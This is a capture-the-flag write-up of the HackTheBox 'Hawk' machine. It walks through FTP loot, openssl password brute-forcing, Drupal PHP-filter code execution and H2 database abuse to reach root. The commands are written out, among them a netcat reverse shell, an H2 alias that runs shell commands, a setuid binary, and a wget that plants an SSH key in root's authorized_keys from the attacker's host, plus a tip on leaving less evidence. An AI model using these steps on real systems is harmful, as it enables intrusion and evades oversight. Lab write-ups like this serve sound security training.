---
title: HTB: Hawk
url: https://0xdf.gitlab.io/2018/11/30/htb-hawk.html
date: 2018-11-30T12:00:44+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-hawk, drupal, ftp, openssl, openssl-bruteforce, php, credentials, h2, htb-smasher, oscp-plus-v1
---

![](https://0xdfimages.gitlab.io/img/hawk-cover.png)Hawk was a pretty easy box, that provided the challenge to decrypt a file with openssl, then use those credentials to get admin access to a Drupal website. I’ll use that access to gain execution on the host via php. Credential reuse by the daniel user allows me to escalate to that user. From there, I’ll take advantage of a H2 database to first get arbitrary file read as root, and then target a different vulnerability to get RCE and a root shell. In Beyond Root, I’ll explore the two other listening ports associated with H2, 5435 and 9092.

## Box Info

| Name | [Hawk](https://hackthebox.com/machines/hawk)  [Hawk](https://hackthebox.com/machines/hawk) [Play on HackTheBox](https://hackthebox.com/machines/hawk) |
| --- | --- |
| Release Date | [14 Jul 2018](https://twitter.com/hackthebox_eu/status/1017340231534735360) |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | ~~Hard [40]~~ Medium [30] |
| Rated Difficulty | Rated difficulty for Hawk |
| Radar Graph | Radar chart for Hawk |
| First Blood User | 00:50:53[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 03:02:54[phra phra](https://app.hackthebox.com/users/19822) |
| Creator | [mrh4sh mrh4sh](https://app.hackthebox.com/users/2570) |

It’s interesting that [the release tweet](https://twitter.com/hackthebox_eu/status/1017340231534735360) shows Hawk as a 40 point box. If it was released as 40, it was eventually reduced to 30, which feels about right to me.

## Recon

### nmap

`nmap` shows 5 open ports:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.102
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-15 14:55 EST
Nmap scan report for 10.10.10.102
Host is up (0.020s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5435/tcp open  sceanics
8082/tcp open  blackice-alerts
9092/tcp open  XmlIpcRegSvc

Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds

root@kali# nmap -p 21,22,80,5435,8082,9092 -sC -sV -oA nmap/scripts 10.10.10.102
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-15 14:55 EST
Nmap scan report for 10.10.10.102
Host is up (0.019s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.24 seconds

```

SSH is worth noting in case I can find some creds. I’ll start with the webservers and FTP, and see what I can find there.

### Drupal - TCP 80

#### Site

The site is a drupal login page which references 192.168.56.103:

![1531683324011](https://0xdfimages.gitlab.io/img/1531683324011.png)

#### drupalgedddon

My first thought was to check for CVE-2018-7600 (or “drupalgeddon2”) vulnerability, which came out around the time of this box’s creation. Unfortunately for me, `http://10.10.10.102/CHANGELOG.txt` shows that this is version 7.58, which is the version that patched this vulnerability.

[drupalgeddon2.rb](https://github.com/dreadlocked/Drupalgeddon2) confirms:

```

root@kali# ruby drupalgeddon2.rb http://10.10.10.102/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.102/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.102/CHANGELOG.txt    (HTTP Response: 200)
[!] WARNING: Might be patched! Found SA-CORE-2018-002: ["http://10.10.10.102/CHANGELOG.txt", "http://10.10.10.102/core/CHANGELOG.txt", "http://10.10.10.102/includes/bootstrap.inc", "http://10.10.10.102/core/includes/bootstrap.inc", "http://10.10.10.102/includes/database.inc"]
[+] Drupal!: v7.58
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo ZVYODJFO
[-] The target timed out ~ Net::ReadTimeout

```

#### gobuster

Nothing stands out in the `gobuster` beyond normal looking Drupal stuff:

```

root@kali# gobuster -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o gobuster/root_php-txt -t 40

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.102/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Output file  : gobuster/root_php-txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php,.txt,.html
=====================================================
/index.php (Status: 200)
/misc (Status: 301)
/themes (Status: 301)
/0 (Status: 200)
/user (Status: 200)
/modules (Status: 301)
/scripts (Status: 301)
/node (Status: 200)
/sites (Status: 301)
/includes (Status: 301)
/install.php (Status: 200)
/profiles (Status: 301)
/README (Status: 200)
/README.txt (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/INSTALL (Status: 200)
/INSTALL.txt (Status: 200)
/LICENSE (Status: 200)
/LICENSE.txt (Status: 200)
/User (Status: 200)
/CHANGELOG (Status: 200)
/CHANGELOG.txt (Status: 200)

```

#### droopscan

`droopscan` doesn’t show much interesting as far as vulnerabilities. It is interesting that the php plugin is there, and that will be useful later.

```

root@kali# droopescan scan drupal -u http://10.10.10.102
[+] Themes found:
    seven http://10.10.10.102/themes/seven/
    garland http://10.10.10.102/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.102/CHANGELOG.txt
    Default admin - http://10.10.10.102/user/login

[+] Possible version(s):
    7.58

[+] Plugins found:
    image http://10.10.10.102/modules/image/
    profile http://10.10.10.102/modules/profile/
    php http://10.10.10.102/modules/php/

[+] Scan finished (0:09:40.951440 elapsed)

```

### H2 Console - TCP 8082

Moving on from Drupal for now, I’ll look at port 8082. It’s a page for the H2 database, but it says it’s configured not to allow connections from “others” (non-localhost):

![1543517900129](https://0xdfimages.gitlab.io/img/1543517900129.png)

### FTP - TCP 21

#### Enumeration

The `nmap` scan indicated that anonymous logins were allowed on the ftp server. Logging in, I find a single file (note that it’s important to do `ls -a` since it’s a hidden file), and pull it back:

```

root@kali# ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (186.6043 kB/s

```

#### Encrypted File - Brute with Bash

The file is encrypted with `openssl`, base64 encoded:

```

root@kali# file .drupal.txt.enc
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded

```

Bash brute force the password with `openssl`. I’ll loop over passwords with the following command: `openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass`.
- `enc` - encrypt / decrypt option
- `-d` - decrypt
- `-a` - base64 encoded content
- `-AES-256-CBC` - cipher (I figured I might have to cycle through a few of these)
- `-in .drupal.txt.enc` - file to decrypt
- `-k $pass` - password to decrypt with

For my bash loop, I’ll loop over the words in rockyou, and for each try the command above. Then I’ll check the exit code stored in `$?`, and if it’s 0 (success), I’ll print the password and exit the loop.

I picked AES-256-CBC first because it’s one of the most common encryption methods. I happened to guess the right cipher on the first try (and this loop runs in less than a second). Had I not guesses the right one, I would have walked through more ciphers, and probably written a loop to loop over them.

With the password, I’ll then use it to get the plaintext:

```

root@kali# cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
Password: friends

root@kali# openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k friends
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

```

#### Alternative crack - openssl-bruteforce

There’s a neat tool called `openssl-bruteforce` from hkh4cks on the NetSecFocus group: https://github.com/HrushikeshK/openssl-bruteforce. It will try your your wordlist against the file for all of the ciphers in a list. It spits out a ton of errors, so be sure to `2> /dev/null`.

```

root@kali# python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
Running pid: 12852      Cipher: AES-128-CBC
Running pid: 13343      Cipher: AES-128-CFB
Running pid: 13351      Cipher: AES-128-CFB1
Running pid: 13359      Cipher: AES-128-CFB8
Running pid: 13367      Cipher: AES-128-CTR
Running pid: 13375      Cipher: AES-128-ECB
Running pid: 13983      Cipher: AES-128-OFB
Running pid: 13991      Cipher: AES-192-CBC
Running pid: 15439      Cipher: AES-192-CFB
Running pid: 15447      Cipher: AES-192-CFB1
Running pid: 15455      Cipher: AES-192-CFB8
Running pid: 15463      Cipher: AES-192-CTR
Running pid: 15471      Cipher: AES-192-ECB
Running pid: 16086      Cipher: AES-192-OFB
Running pid: 16094      Cipher: AES-256-CBC
Password found with algorithm AES-256-CBC: friends
Data:
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
------------------------------------------
Running pid: 16190      Cipher: AES-256-CFB
Running pid: 16198      Cipher: AES-256-CFB1
...[snip]...

```

## RCE Via Drupal - Shell as www-data

### Prep

The password from the file works to log in as admin to the Drupal interface:

![1543515525870](https://0xdfimages.gitlab.io/img/1543515525870.png)

![1543515561515](https://0xdfimages.gitlab.io/img/1543515561515.png)

Now, with access, I’ll change the settings to allow PHP execution in posts. Under modules, I’ll check “PHP filter”:

![1531877405108](https://0xdfimages.gitlab.io/img/1531877405108.png)

### PHP RCE –> Shell

I’ll create a new article by clicking “Content” -> “Add content” -> “Article”. Because I’ve enabled the PHP filter, one option for “Test format” is “php”, which I’ll select, enabling me to add php code. I’ll test it by creating an article that contains `<?php phpinfo(); ?>`. On hitting “Preview”:

![1531824863447](https://0xdfimages.gitlab.io/img/1531824863447.png)

So get a shell with `<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.156 9001 >/tmp/f'); ?>`. On preview:

```

root@kali# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.156] from (UNKNOWN) [10.10.10.102] 43068
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
**OPSEC Note:** You don’t need to actually publish any changes in most CMS systems to get your execution. If there’s a preview option, it will show the code to just you, and still run it. Then, you can leave the post and not publish, leaving less evidence behind.

With shell, get user.txt:

```

$ cd /home/daniel
$ cat user.txt
d5111d4f...

```

## Privesc: www-data -> daniel

Whenever I get on a box via a web exploit, I also look for database config information in the web pages. In this case, Drupal settings are stored in `/var/www/html/sites/default/settings.php`:

```

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'drupal4hawk',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

That password actually works for daniel:

```

www-data@hawk:/var/www/html$ su daniel
Password:
Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>

```

What? Why a python shell? The user’s shell is set to python:

```

www-data@hawk:/var/www/html$ grep daniel /etc/passwd
daniel:x:1002:1005::/home/daniel:/usr/bin/python3

```

Still, it is easy enough to escape:

```

>>> import subprocess
>>> subprocess.call('/bin/bash', shell=True)
daniel@hawk:/var/www/html$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)

```

`pty.spawn("/bin/bash")` also works to escape the python shell.

This password also allows SSH access as daniel as well:

```

root@kali# ssh daniel@10.10.10.102
daniel@10.10.10.102's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
...[snip]...
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty;pty.spawn('/bin/bash')
daniel@hawk:~$

```

## Privesc: daniel -> root

### Enumeration

I noticed that h2 is running as root:

```

root        814  0.0  0.0   4628   868 ?        Ss   Nov25   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root        816  0.0  6.8 2339688 67568 ?       Sl   Nov25   4:05 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar

```

[H2](http://www.h2database.com/html/main.html) is a Java based SQL database. Earlier I came across the H2 page on port 8082. Now I can get local access, using SSH tunnels (check out [previous post on tunnels](/2018/06/10/intro-to-ssh-tunneling.html) for details):

```

root@kali# ssh daniel@10.10.10.102 -L 8082:localhost:8082

```

Now, visiting `http://127.0.0.1:8082/` gives me the real console:

![1531995501016](https://0xdfimages.gitlab.io/img/1531995501016.png)

### Root #1 - Read Files As Root Via Backup

A quick way to get the root flag is to take advantage of an information disclosure vulnerability. At the top of the page is a link to “Tools”, which takes me to this page:

![1531995526232](https://0xdfimages.gitlab.io/img/1531995526232.png)

Some of the tools require usename and password, but others don’t, including the “Backup” function:

![1543523814177](https://0xdfimages.gitlab.io/img/1543523814177.png)

This function will look for .db files in a target directory as root, and save them in a zip.

I’ll first prep the environment by creating a symbolic link to the file I want to read:

```

daniel@hawk:~/.a$ ln -s /root/root.txt t.trace.db

daniel@hawk:~/.a$ ls -la
total 12
drwxrwxr-x 2 daniel daniel 4096 Aug  2 17:45 .
drwxr-xr-x 6 daniel daniel 4096 Aug  2 17:44 ..
lrwxrwxrwx 1 daniel daniel   14 Aug  2 17:45 t.trace.db -> /root/root.txt

```

Next, I’ll tell backup to backup that directory:

![1533232101327](https://0xdfimages.gitlab.io/img/1533232101327.png)

On hitting submit, it tells me it processed my file:

![1533232117902](https://0xdfimages.gitlab.io/img/1533232117902.png)

And I’ll find the file where I told it to be:

```

daniel@hawk:~/.a$ ls -la a
-rw-r--r-- 1 root root 175 Aug  2 17:45 a
daniel@hawk:~/.a$ file a
a: Zip archive data, at least v2.0 to extract

```

On bringing it back to my box, I get the flag:

```

root@kali# unzip -l backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       33  2018-08-02 17:45   root/root.txt
---------                     -------
       33                     1 file

root@kali# unzip backup
Archive:  backup.zip
  inflating: root/root.txt
root@kali# cat root/root.txt
54f3e840...

```

Someone did script this up in python, and it’s on exploit-db: https://www.exploit-db.com/exploits/45105. When run from the host with h2, it will create the symlink and run backup, generating the zip.

### Logging Into H2

Just reading files isn’t enough… I want a root shell. I have a good method to get one, but it requires logging into the database GUI. I found two ways to do that.

#### #1 - Non-Existent Database

The first, and easiest way in is to change the database to something that doesn’t exist, and then login. The first time you log in, it will take any username and password, and then those will be saved and checked for future logins.

In the following video, I’ll try to connect to the default db that shows up when I get to the page. It won’t connect. I tried a couple passwords, including `drupal4hawk`. Then, I’ll change the db to something that clearly doesn’t exist, adding “-0xdf” to the end. Whatever I do next will set a username and password. I’ll set user sa, with blank password. After that, any password I try will fail, until I go back to sa with blank password, and it logs me in.

![](https://0xdfimages.gitlab.io/img/hawk-new-db.gif)

#### #2 - Backup / Modify / Restore [Kind Of]

I’ll use the backup utility again, this time to get the actual database in use, saving it to the tmp directory:

![1543526305279](https://0xdfimages.gitlab.io/img/1543526305279.png)

Run results in this output:

![1543526366443](https://0xdfimages.gitlab.io/img/1543526366443.png)

I’ll pull `.backup.zip` back to my box, and open it:

```

root@kali# unzip .backup.zip
Archive:  .backup.zip
  inflating: test.trace.db
  inflating: test.mv.db

```

There’s an interesting line in `test.mv.db`:

```

root@kali# strings test.mv.db | grep ADMIN
CREATE USER IF NOT EXISTS SA SALT '8c7f62c31903e978' HASH 'a942ba85504826fb7f25db0920650ad77c66570d526f76d4d3b9b0f6432daeef' ADMIN

```

I can replace that with my own information:

```

root@kali# strings test.mv.db | grep ADMIN
CREATE USER IF NOT EXISTS SA PASSWORD 'dfdf' ADMIN

```

Then zip, upload to target, and point restore at the zip.

This method is super flaky. I got it to work a couple times, but have had it not work many more. Often, I end up corrupting the database.

### Root #2 - Root Shell via Console and Alias Shell Exec

With access to the panel, I can get code execution. There’s a neat blog post that describes how to get command execution through the H2 console here: https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

First, I’ll create an alias that gives shell execution by running this:

```

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

```

Then, I can call it to see the output:

![](https://0xdfimages.gitlab.io/img/hawk-shellexec.gif)

I actually had a surprisingly difficult time going from this code execution to a shell. I tried the standard [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but none seemed to work. I tried adding to the sudoers file, but that didn’t work either. I can’t explain this yet (if you can, leave a comment).

Even if you can’t run the commands directly, there are tons of ways to get to root from here.

The first thing I did get to work was to create a setuid binary, starting with this c code:

```

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    setreuid(0, 0);
    execve("/bin/sh", NULL, NULL);
}

```

Compiled:

```

root@kali# gcc -o shell /opt/shells/setuid/exec.c

```

Started a web server:

```

root@kali# python3 -m http.server 81

```

Then, issued the following commands into the console:

![1543530450157](https://0xdfimages.gitlab.io/img/1543530450157.png)

On doing that, `.a` showed up in tmp, owned by root, with the setuid bit:

```

daniel@hawk:/tmp$ ls -la .a
-rwsrwxr-x 1 root root 16664 Nov 29  2018 .a

```

Running that gives me a root shell:

```

daniel@hawk:/tmp$ ./.a
# id
uid=0(root) gid=1005(daniel) groups=1005(daniel)

```
*July 2023 note: Much like in [Smasher](/2018/11/24/htb-smasher.html#exploiting-checker), Hawk must have gotten some maintenance that updated the OS to include protections for `/tmp`. The above strategy no longer works from `/tmp`, but moving to `/home/daniel` works just fine.*

Another alternative was to create an ssh key pair, and then use:

```

CALL SHELLEXEC('wget -O /root/.ssh/authorized_keys http://10.10.14.3:81/id_rsa.pub');

```

From there, I could ssh in as root.

A third idea that worked was putting one of the reverse shells in a file as a bash script, and having root run it.

## Beyond Root - Other Listening Ports

In my initial nmap scan, I noticed two more ports open that I haven’t accounted for yet: 5435 and 9092. It turns out, they are both H2 related. When you start H2, it will report something like:

```

Web Console server running at http://127.0.1.1:8082 (only local connections)
TCP server running at tcp://127.0.1.1:9092 (only local connections)
PG server running at pg://127.0.1.1:5435 (only local connections)

```

But on Hawk, these two ports were not local only.

If I poke at 9092, I get this:

![1543542886645](https://0xdfimages.gitlab.io/img/1543542886645.png)

`curl` makes it more clear (when forcing binary output to display with `--output -`:

```

root@kali# curl 10.10.10.102:9092 --output -
90117FRemote connections to this server are not allowed, see -tcpAllowOthers`org.h2.jdbc.JdbcSQLException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-196]
        at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
        at org.h2.message.DbException.get(DbException.java:179)
        at org.h2.message.DbException.get(DbException.java:155)
        at org.h2.message.DbException.get(DbException.java:144)
        at org.h2.server.TcpServerThread.run(TcpServerThread.java:82)
        at java.base/java.lang.Thread.run(Thread.java:844)

```

This port is meant to be connected to via a program. So I can use a tool like `dbeaver` to connect. Unfortunately for us (fortunately for users of H2), we still need credentials to get to a database.

In the video below, I’ll use `dbeaver` to connect. I’ll try to connect directly, but get rejected. Then I’ll connect to an ssh tunnel I have from 9092 on my local box to 9092 on hawk. I’ll show that I still can’t connect to the test database, but when I add an ‘s’ to make a new database that doesn’t exist, I create it and create that first user. Then I can log in.

![](https://0xdfimages.gitlab.io/img/hawk-dbeaver.gif)

Port 5435 is the “PG” Server, where PG stands for PostgreSQL protocol, and it could be connected to as well to run Postgres queries.

There’s probably more research to do into these two ports and how we might abuse them…